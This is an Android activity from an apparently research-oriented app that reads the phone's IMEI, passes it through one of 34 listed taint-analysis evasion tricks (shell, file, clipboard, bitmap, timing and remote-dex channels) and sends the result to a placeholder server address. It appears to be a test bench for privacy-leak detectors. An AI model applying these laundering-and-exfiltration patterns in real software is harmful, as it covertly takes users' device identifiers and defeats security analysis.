package com.inayoshi.atatechniques;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.ContentFrameLayout;

import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import com.inayoshi.atatechniques.controldependencies.CDBitmapCache;
import com.inayoshi.atatechniques.controldependencies.CDBitmapPixel;
import com.inayoshi.atatechniques.controldependencies.CDClipboardLength;
import com.inayoshi.atatechniques.controldependencies.CDDirectBuffer;
import com.inayoshi.atatechniques.controldependencies.CDFileLastModified;
import com.inayoshi.atatechniques.controldependencies.CDFileLength;
import com.inayoshi.atatechniques.controldependencies.CDFileShellHybrid;
import com.inayoshi.atatechniques.controldependencies.CDLookupTable;
import com.inayoshi.atatechniques.controldependencies.CDShellCommand;
import com.inayoshi.atatechniques.controldependencies.CDTextScaling;
import com.inayoshi.atatechniques.controldependencies.CDTimekeeper;
import com.inayoshi.atatechniques.controldependencies.CountToX;
import com.inayoshi.atatechniques.controldependencies.ExceptionError;
import com.inayoshi.atatechniques.controldependencies.RemoteControl;
import com.inayoshi.atatechniques.controldependencies.RemoteDex;
import com.inayoshi.atatechniques.controldependencies.SimpleEncoding;
import com.inayoshi.atatechniques.directassignments.BitmapCache;
import com.inayoshi.atatechniques.directassignments.FileLastModified;
import com.inayoshi.atatechniques.directassignments.FileShellHybrid;
import com.inayoshi.atatechniques.directassignments.ShellCommand;
import com.inayoshi.atatechniques.directassignments.TextScaling;
import com.inayoshi.atatechniques.memoryoperations.BitmapPixel;
import com.inayoshi.atatechniques.memoryoperations.ClipboardLength;
import com.inayoshi.atatechniques.memoryoperations.FileLength;
import com.inayoshi.atatechniques.memoryoperations.ReverseDirectBuffer;
import com.inayoshi.atatechniques.memoryoperations.ReverseLookupTable;
import com.inayoshi.atatechniques.timingchannels.TCCountToX;
import com.inayoshi.atatechniques.timingchannels.TCExceptionError;
import com.inayoshi.atatechniques.timingchannels.TCFileShellHybrid;
import com.inayoshi.atatechniques.timingchannels.TCRemoteControl;
import com.inayoshi.atatechniques.timingchannels.TCRemoteDex;
import com.inayoshi.atatechniques.timingchannels.TCShellCommand;
import com.inayoshi.atatechniques.timingchannels.TCSimpleEncoding;
import com.inayoshi.atatechniques.timingchannels.Timekeeper;

import java.io.File;

public class MainActivity extends AppCompatActivity {
    public static String TAG = "ATATechniques";
    public static String hostIPAddr = "0.0.0.0";
    public static int hostPort = 9000;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Server server = new Server(hostIPAddr, hostPort);
        File filesDir = getFilesDir();
        TextView textView = findViewById(R.id.atatechniques);
        ContentFrameLayout contentFrameLayout = findViewById(android.R.id.content);
        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);

        // TAINT SOURCE (IMEI)
        TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String srcTainted = manager.getDeviceId();
        Log.i(TAG, "[source] tainted value: " + srcTainted);

        // ATA TECHNIQUES
        String srcUntainted = "";
        //// Test
        srcUntainted = testTechnique(srcTainted);

        //// Direct-assignment (DA) flows: 5 techniques
        //srcUntainted = ShellCommand.trick(srcTainted);
        //srcUntainted = FileShellHybrid.trick(srcTainted, filesDir);
        //srcUntainted = TextScaling.trick(srcTainted, textView);
        //srcUntainted = BitmapCache.trick(srcTainted, filesDir, textView, contentFrameLayout);
        //srcUntainted = FileLastModified.trick(srcTainted, filesDir);

        //// Memory-operation (MO) flows: 5 techniques
        //srcUntainted = FileLength.trick(srcTainted, filesDir);
        //srcUntainted = ClipboardLength.trick(srcTainted, clipboardManager);
        //srcUntainted = BitmapPixel.trick(srcTainted);
        //srcUntainted = ReverseDirectBuffer.trick(srcTainted);
        //srcUntainted = ReverseLookupTable.trick(srcTainted);

        //// Control-dependence (CD) flows: 16 techniques
        //srcUntainted = SimpleEncoding.trick(srcTainted);
        //srcUntainted = CountToX.trick(srcTainted);
        //srcUntainted = ExceptionError.trick(srcTainted);
        //srcUntainted = CDShellCommand.trick(srcTainted);
        //srcUntainted = CDFileShellHybrid.trick(srcTainted);
        //srcUntainted = CDTimekeeper.trick(srcTainted);
        //srcUntainted = CDFileLength.trick(srcTainted, filesDir);
        //srcUntainted = CDClipboardLength.trick(srcTainted, clipboardManager);
        //srcUntainted = CDBitmapPixel.trick(srcTainted);
        //srcUntainted = CDDirectBuffer.trick(srcTainted);
        //srcUntainted = CDTextScaling.trick(srcTainted, textView);
        //srcUntainted = CDBitmapCache.trick(srcTainted, filesDir, textView, contentFrameLayout);
        //srcUntainted = CDFileLastModified.trick(srcTainted, filesDir);
        //srcUntainted = CDLookupTable.trick(srcTainted);
        //srcUntainted = RemoteControl.trick(srcTainted);
        //srcUntainted = RemoteDex.trick(srcTainted);

        //// Timing-channel (TC) flows: 8 techniques
        //srcUntainted = TCSimpleEncoding.trick(srcTainted);
        //srcUntainted = TCCountToX.trick(srcTainted);
        //srcUntainted = TCExceptionError.trick(srcTainted);
        //srcUntainted = TCShellCommand.trick(srcTainted);
        //srcUntainted = TCFileShellHybrid.trick(srcTainted, filesDir);
        //srcUntainted = Timekeeper.trick(srcTainted);
        //srcUntainted = TCRemoteControl.trick(srcTainted);
        //srcUntainted = TCRemoteDex.trick(srcTainted);

        // TAINT SINK
        Log.i(TAG, "[sink] untainted value:" + srcUntainted);
        server.execute(srcUntainted);
    }

    private String testTechnique(String in) {
        return in;
    }
}
